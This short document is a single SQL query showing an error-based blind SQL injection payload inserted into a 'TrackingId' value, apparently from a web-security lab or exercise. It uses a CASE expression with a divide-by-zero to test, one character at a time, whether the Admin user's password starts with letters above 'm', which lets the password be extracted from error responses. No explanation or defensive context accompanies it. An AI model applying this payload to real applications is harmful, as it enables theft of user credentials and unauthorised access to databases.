SELECT * FROM Users 
WHERE TrackingId = 'xyz' 
AND (SELECT CASE WHEN (Username = 'Admin' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END)='a';
